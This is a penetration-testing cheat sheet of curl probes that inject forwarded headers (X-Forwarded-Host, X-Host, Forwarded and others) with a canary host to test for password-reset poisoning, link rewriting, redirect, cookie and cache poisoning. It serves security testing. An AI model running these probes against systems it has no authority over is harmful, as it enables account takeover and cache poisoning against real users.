# Forwarded headers — the X-Forwarded-Host/X-Host/X-Forwarded-*/Forwarded sinks, exhaustively

The forwarded headers — the app's canonical URLs, reset links, redirects.

---

## 1. The model — a reflected forwarded header

```text
the app reads a forwarded header for its canonical URLs — a reflected or
a rewritten forwarded header poisons the app's links — the links/scripts
point to attacker.com — a stored injection, a cache-poisoning feed, a
password-reset poisoning.
```

## 2. X-Forwarded-Host — the generated URLs, reset links

```bash
# a client-supplied X-Forwarded-Host — the app's links rewritten
curl -s -D - -H 'X-Forwarded-Host: canary.example' "$BASE/reset" | grep -i 'location\|set-cookie'
#   the reset link points to canary.example → an account takeover
curl -s -H 'X-Forwarded-Host: canary.example' "$BASE/page" | grep -o 'canary[^"< ]*'
#   the page's links/scripts point to canary.example → a stored injection
```

## 3. X-Host — the generated URLs, reset links

```bash
# a client-supplied X-Host — the app's links rewritten
curl -s -D - -H 'X-Host: canary.example' "$BASE/reset" | grep -i 'location\|set-cookie'
#   the reset link points to canary.example → an account takeover
curl -s -H 'X-Host: canary.example' "$BASE/page" | grep -o 'canary[^"< ]*'
#   the page's links/scripts point to canary.example → a stored injection
```

## 4. X-Forwarded-Server — the generated URLs

```bash
# a client-supplied X-Forwarded-Server — the app's links rewritten
curl -s -D - -H 'X-Forwarded-Server: canary.example' "$BASE/reset" | grep -i 'location\|set-cookie'
#   the reset link points to canary.example → an account takeover
```

## 5. X-HTTP-Host-Override — the generated URLs

```bash
# a client-supplied X-HTTP-Host-Override — the app's links rewritten
curl -s -D - -H 'X-HTTP-Host-Override: canary.example' "$BASE/reset" | grep -i 'location\|set-cookie'
#   the reset link points to canary.example → an account takeover
```

## 6. X-Forwarded-Proto — the scheme downgrade

```bash
# a client-supplied X-Forwarded-Proto — the app's links rewritten
curl -s -D - -H 'X-Forwarded-Proto: http' "$BASE/page" | grep -i 'location\|set-cookie'
#   the app's links use http → a downgrade surface
```

## 7. X-Forwarded-Scheme — the scheme downgrade

```bash
# a client-supplied X-Forwarded-Scheme — the app's links rewritten
curl -s -D - -H 'X-Forwarded-Scheme: http' "$BASE/page" | grep -i 'location\|set-cookie'
#   the app's links use http → a downgrade surface
```

## 8. Forwarded — the RFC 7239 form

```bash
# a client-supplied Forwarded header — the RFC 7239 form
curl -s -H 'Forwarded: host=canary.example' "$BASE/page" | grep -o 'canary[^"< ]*'
#   the page's links point to canary.example → a stored injection
curl -s -H 'Forwarded: for=127.0.0.1;host=canary.example;proto=http' "$BASE/page" | grep -o 'canary[^"< ]*'
#   a chained forwarded — the host rewritten
curl -s -H 'Forwarded: host=canary.example;for=127.0.0.1' "$BASE/page" | grep -o 'canary[^"< ]*'
#   a chained forwarded — the host rewritten
```

## 9. X-Forwarded-Port — the port rewrite

```bash
# a client-supplied X-Forwarded-Port — the app's links rewritten
curl -s -D - -H 'X-Forwarded-Port: 8080' "$BASE/page" | grep -i 'location\|set-cookie'
#   the app's links use port 8080 → a port rewrite
```

## 10. X-Forwarded-Path — the path rewrite

```bash
# a client-supplied X-Forwarded-Path — the app's links rewritten
curl -s -D - -H 'X-Forwarded-Path: /admin' "$BASE/page" | grep -i 'location\|set-cookie'
#   the app's links use /admin → a path rewrite
```

## 11. X-Forwarded-Prefix — the prefix rewrite

```bash
# a client-supplied X-Forwarded-Prefix — the app's links rewritten
curl -s -D - -H 'X-Forwarded-Prefix: /admin' "$BASE/page" | grep -i 'location\|set-cookie'
#   the app's links use /admin → a prefix rewrite
```

## 12. The forwarded-header's sinks — where it poisons

```text
a canonical URL      → the app's links/scripts point to attacker.com
a password-reset link → the reset link points to attacker.com — an
                      account takeover
a Location redirect  → an open redirect, an SSO flow poisoning
a Set-Cookie domain  → a session fixation surface
a cache key          → a cache-poisoning feed — poison once, the cache
                     serves your host to everyone
```

## 13. The forwarded-header's falsifier — a proxy that strips

```text
a proxy that strips the client-supplied forwarded header → the header
doesn't reach the app → the bypass fails → a different class.
```

## 14. The forwarded-header's falsifier — a proxy that verifies

```text
a proxy that verifies the forwarded header it added → a client-supplied
header is rejected → the bypass fails → a different class.
```

## 15. The forwarded-header's reach — the downstream

```text
the forwarded-header's reach is the downstream — a canonical URL the
app's links rewrite — a reset link the victim clicks — a cache key the
cache stores — a Location the proxy redirects — a Set-Cookie the app
binds.
```
